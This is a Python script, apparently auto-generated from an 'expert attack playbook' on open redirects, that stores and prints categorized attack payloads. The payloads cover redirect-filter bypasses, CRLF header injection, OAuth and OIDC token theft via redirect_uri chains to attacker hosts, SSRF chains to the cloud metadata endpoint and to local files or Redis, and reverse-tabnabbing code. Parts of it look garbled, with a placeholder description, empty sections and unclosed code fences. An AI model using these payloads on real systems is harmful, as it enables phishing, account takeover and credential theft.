#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/open-redirect

Skill: SKILL: Open Redirect — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-open-redirect.py --help
      python hack-skills-open-redirect.py --list
      python hack-skills-open-redirect.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/open-redirect'
TITLE = 'SKILL: Open Redirect — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: open-redirect", "description: >-", "Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations."],
    'skill-open-redirect-expert-attack-playbook': [],
    '1-core-concept': ["Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a \"launchpad\" for phishing or token theft.", "https://trusted.com/redirect?url=https://evil.com", "\u2192 User sees trusted.com in the link \u2192 clicks \u2192 lands on evil.com"],
    '2-finding-redirect-parameters': [],
    'common-parameter-names': ["```text", "?url=           ?redirect=      ?next=          ?dest=", "?destination=   ?redir=         ?return=        ?returnUrl=", "?go=            ?forward=       ?target=        ?out=", "?continue=      ?link=          ?view=          ?to=", "?ref=           ?callback=      ?path=          ?rurl="],
    'server-side-sinks': ["HTTP 301/302 Location header", "PHP: header(\"Location: $input\")", "Python: redirect(input)", "Java: response.sendRedirect(input)", "Node: res.redirect(input)"],
    'client-side-javascript-sinks': ["```javascript", "window.location = input", "window.location.href = input", "window.location.replace(input)", "window.open(input)", "document.location = input"],
    '3-filter-bypass-techniques': ["```text"],
    'protocol-relative': ["//evil.com"],
    'userinfo-bypass': ["https://trusted.com@evil.com"],
    'backslash-trick': ["/\\evil.com", "/\\/evil.com"],
    'url-encoding': ["https://trusted.com/%2F%2Fevil.com"],
    'django-endswith-bypass': ["http://evil.com/www.target.com", "http://evil.com?target.com"],
    'trusted-site-double-redirect-e-g-via-baidu-link-service': ["https://link.target.com/?url=http://evil.com"],
    'special-character-confusion': ["http://evil.com#@trusted.com        # fragment as authority", "http://evil.com?trusted.com         # query string confusion", "http://trusted.com%00@evil.com      # null byte truncation"],
    'tab-newline-in-url-browser-ignores-whitespace': ["java%09script:alert(1)"],
    '4-exploitation-chains': [],
    'phishing-amplification': ["Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`", "Victim sees `bigbank.com` \u2192 clicks \u2192 enters credentials on clone site."],
    'oauth-token-theft': ["If OAuth `redirect_uri` allows open redirect on the authorized domain:", "/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com", "\u2192 Authorization code or token appended to evil.com URL", "\u2192 Attacker captures token from URL fragment or query"],
    'csrf-referer-bypass': ["Some CSRF protections check `Referer` header contains trusted domain:", "1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email", "2. Redirect preserves Referer from trusted.com", "3. CSRF protection passes because Referer = trusted.com"],
    'ssrf-via-redirect': ["When server follows redirects:", "?url=https://attacker.com/redirect-to-internal"],
    'attacker-com-returns-302-http-169-254-169-254': [],
    'server-follows-redirect-ssrf-to-metadata-endpoint': [],
    '5-testing-checklist': ["\u25a1 Identify all URL parameters that trigger redirects", "\u25a1 Test external domain: ?url=https://evil.com", "\u25a1 Test protocol-relative: ?url=//evil.com", "\u25a1 Test userinfo bypass: ?url=https://trusted.com@evil.com", "\u25a1 Test backslash: ?url=/\\evil.com", "\u25a1 Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)", "\u25a1 Check OAuth flows for redirect_uri open redirect", "\u25a1 Verify if redirect preserves auth tokens in URL"],
    '6-tabnabbing-reverse-tabnabbing': [],
    'concept': ["When a link opens a new tab with `target=\"_blank\"` WITHOUT `rel=\"noopener\"`:", "- The new page can access `window.opener`", "- It can redirect the ORIGINAL page: `window.opener.location = \"https://phishing.com/login\"`", "- User returns to \"original\" tab \u2192 sees fake login page \u2192 enters credentials"],
    'detection': ["```html", "<!-- Vulnerable: -->", "<a href=\"https://external.com\" target=\"_blank\">Click here</a>", "<!-- Safe: -->", "<a href=\"https://external.com\" target=\"_blank\" rel=\"noopener noreferrer\">Click here</a>"],
    'exploitation': ["```javascript", "// On the attacker-controlled page (opened via target=\"_blank\"):", "if (window.opener) {", "window.opener.location = \"https://phishing.com/fake-login.html\";"],
    'where-to-look': ["- User-generated content with links (forums, comments, profiles)", "- `target=\"_blank\"` links to external domains", "- PDF viewers, document previews opening in new tabs"],
    '7-open-redirect-oauth-token-theft-detailed-chains': [],
    '7-1-oauth-implicit-flow': ["In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:", "```text", "/authorize?response_type=token", "&client_id=CLIENT", "&redirect_uri=https://target.com/callback/../redirect?url=https://evil.com", "&scope=read", "Flow:", "1. User authenticates \u2192 authorization server redirects to:", "https://target.com/redirect?url=https://evil.com#access_token=SECRET", "2. Open redirect fires \u2192 browser navigates to:", "https://evil.com#access_token=SECRET", "3. Attacker page reads location.hash \u2192 captures access token"],
    '7-2-authorization-code-flow': ["The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:", "```text", "/authorize?response_type=code", "&client_id=CLIENT", "&redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com", "Flow:", "1. Authorization server validates redirect_uri prefix \u2192 matches https://target.com/", "2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE", "3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE", "4. Attacker exchanges code for access token"],
    '7-3-oidc-id-token-fragment-leak': ["```text", "/authorize?response_type=id_token", "&client_id=CLIENT", "&redirect_uri=https://target.com/cb", "&nonce=NONCE", "If redirect_uri points to open redirect endpoint:", "\u2192 id_token in fragment sent to attacker", "\u2192 Attacker has signed identity assertion", "\u2192 Can authenticate as victim on any RP accepting this IdP"],
    '7-4-redirect-uri-validation-bypass-patterns': ["```text", "redirect_uri=https://target.com/callback/../open-redirect?url=evil.com", "redirect_uri=https://target.com/callback?next=https://evil.com", "redirect_uri=https://target.com/callback%23@evil.com", "redirect_uri=https://target.com/callback/../../redirect", "redirect_uri=https://target.com/callback#@evil.com"],
    '8-open-redirect-ssrf-chain': [],
    'server-side-redirect-following': ["When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):", "```text", "1. Submit URL to server-side fetcher: http://attacker.com/redirect", "2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/", "3. Server follows redirect \u2192 SSRF to cloud metadata endpoint", "4. Response (IAM credentials) returned to attacker or visible in preview"],
    'multi-hop-redirect-for-filter-bypass': ["```text", "1. Server blocks direct requests to 169.254.169.254", "2. Submit: http://attacker.com/r1", "3. r1 \u2192 302 \u2192 http://attacker.com/r2  (same domain, passes filter)", "4. r2 \u2192 302 \u2192 http://169.254.169.254/ (internal, filter not re-checked)"],
    'dns-rebinding-variant': ["```text", "1. attacker.com resolves to attacker's public IP (TTL=0)", "2. Server resolves attacker.com \u2192 public IP \u2192 passes SSRF filter", "3. Connection established, but HTTP redirect points to attacker.com again", "4. Second DNS resolution: attacker.com now resolves to 169.254.169.254", "5. Server follows redirect to internal address"],
    'scope-escalation-via-redirect-protocols': ["```text", "http://attacker.com/redirect \u2192 gopher://127.0.0.1:6379/...  (Redis SSRF)", "http://attacker.com/redirect \u2192 file:///etc/passwd            (local file read)", "http://attacker.com/redirect \u2192 dict://127.0.0.1:11211/       (Memcached)", "Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do."],
    '9-url-parser-confusion-for-redirect-bypass': ["When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:"],
    'protocol-relative-url': ["```text", "//attacker.com", "\u2192 Browser: https://attacker.com (inherits current page protocol)", "\u2192 Some validators: relative path \"/attacker.com\" (wrong)"],
    'backslash-confusion': ["```text", "\\/\\/attacker.com", "/\\/attacker.com", "\u2192 Many browsers normalize \\ to / in URLs", "\u2192 Validators treating \\ as path character may allow it"],
    'userinfo-section-abuse': ["```text", "//attacker.com\\@target.com", "\u2192 Browser: navigates to attacker.com (@ is userinfo delimiter)", "\u2192 Validator sees \"target.com\" in the string \u2192 passes allowlist check", "//target.com@attacker.com", "\u2192 Browser: userinfo=target.com, host=attacker.com", "\u2192 Validator checks \"starts with target.com\" \u2192 passes", "https://target.com%2F@attacker.com", "\u2192 URL-decoded: target.com/ as userinfo, host=attacker.com"],
    'double-encoding': ["```text", "//attacker%252ecom", "\u2192 First decode: //attacker%2ecom (passes validator)", "\u2192 Second decode (by server/browser): //attacker.com (actual redirect)"],
    'crlf-injection-redirect': ["```text", "/%0d%0aLocation:%20https://attacker.com", "\u2192 If server reflects the path in a header context:", "HTTP/1.1 302 Found", "Location: /", "Location: https://attacker.com  \u2190 injected header wins"],
    'fragment-confusion': ["```text", "https://target.com#@attacker.com", "\u2192 Browser: host=target.com, fragment=@attacker.com", "\u2192 But some JS-based redirects: window.location = url \u2192 may process differently", "https://attacker.com#.target.com", "\u2192 Validator: sees \"target.com\" in string \u2192 passes", "\u2192 Browser: navigates to attacker.com (fragment ignored in navigation)"],
    'special-characters': ["```text", "https://attacker.com%E3%80%82target.com", "\u2192 Unicode ideographic full stop (U+3002) \u2014 some parsers treat as dot", "\u2192 Browser may normalize differently than validator", "https://attacker\u3002com    (U+3002 fullwidth period)", "https://attacker\uff0ecom    (U+FF0E fullwidth full stop)"],
    'combined-url-parser-differential-table': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()